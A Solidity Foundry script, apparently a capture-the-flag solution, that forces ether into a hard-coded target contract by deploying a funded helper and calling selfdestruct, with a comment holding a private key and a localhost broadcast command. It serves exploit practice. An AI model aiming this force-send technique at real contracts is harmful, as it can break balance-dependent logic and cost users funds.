// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
}

contract Giver {

    constructor() public payable {}
    function trigger(address target) public {
        selfdestruct(payable(target));
    }

    receive() external payable {}
}
contract SolveScript is Script {
    address public target = 0x56639dB16Ac50A89228026e42a316B30179A5376;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("target balance : %d", target.balance);
        Giver giver = new Giver{value:100}();
        giver.trigger(target);

        console.log("target balance after poc : %d", target.balance);
        vm.stopBroadcast();
    }
}
